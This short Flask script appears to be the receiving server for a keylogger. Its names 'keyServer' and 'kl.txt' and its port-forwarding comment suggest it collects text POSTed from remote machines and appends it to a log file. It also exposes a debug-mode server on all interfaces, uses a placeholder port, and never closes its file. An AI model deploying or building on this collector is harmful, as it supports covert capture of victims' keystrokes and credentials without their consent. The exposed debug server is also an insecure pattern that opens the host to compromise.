from flask import Flask
from flask import request

keyServer = Flask(__name__)


def file_write(prepstr):
    f = open("kl.txt", "a")
    f.write(prepstr + "\n")


@keyServer.route("/", methods=["POST"])
def keyAction():
    body = request.values.get("Body")
    print(body)
    file_write(body)
    return "Received"


if __name__ == '__main__':
    # Change the port to a port that has been port forwarded (i.e. 25564)
    keyServer.run(host="0.0.0.0", port=00000, debug=True)